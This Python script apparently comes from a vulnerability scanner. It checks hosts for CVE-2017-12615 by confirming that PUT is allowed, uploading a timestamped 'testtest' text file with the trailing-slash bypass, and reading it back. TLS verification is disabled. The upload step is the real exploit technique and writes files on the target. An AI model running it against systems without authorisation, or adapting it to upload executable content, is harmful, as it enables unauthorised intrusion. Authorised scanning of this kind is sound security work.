import http.client
import sys
import time
import ssl
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from config.config_requests import headers as request_headers, get_proxies

body = "testtest"

def check_vuln(url, port, scheme):
    try:
        vurl = f"{scheme}://{url}:{port}"
        conn_host = str(url) + ':' + str(port)
        use_https = scheme == 'https'
        
        ssl_context = None
        if use_https:
            ssl_context = ssl.create_default_context()
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
        
        if use_https:
            conn = http.client.HTTPSConnection(conn_host, context=ssl_context)
        else:
            conn = http.client.HTTPConnection(conn_host)
        conn.request(method='OPTIONS', url='/ffffzz')
        response_headers = dict(conn.getresponse().getheaders())
        if ('Allow' in response_headers and response_headers['Allow'].find('PUT') > 0) or \
           ('allow' in response_headers and response_headers['allow'].find('PUT') > 0):
            conn.close()
            if use_https:
                conn = http.client.HTTPSConnection(conn_host, context=ssl_context)
            else:
                conn = http.client.HTTPConnection(conn_host)
            test_file_path = "/" + str(int(time.time())) + '.txt/'
            conn.request(method='PUT', url=test_file_path, body=body)
            res = conn.getresponse()
            conn.close()
            
            if res.status in [201, 204]:
                try:
                    test_file_url = vurl + test_file_path[:-1]
                    r = requests.get(test_file_url, headers=request_headers, proxies=get_proxies(), verify=False, timeout=5)
                    if r.status_code == 200 and body in r.text:
                        return (1, '[+] [{}] is Vulnerable to cve_2017_12615!'.format(vurl))
                except Exception:
                    pass
    except Exception:
        pass
    return None

def run(url, port):
    for scheme in ['http', 'https']:
        result = check_vuln(url, port, scheme)
        if result and result[0] == 1:
            return result
    return (0, "")

if __name__=="__main__":
    url = sys.argv[1]
    port = int(sys.argv[2])
    run(url,port)
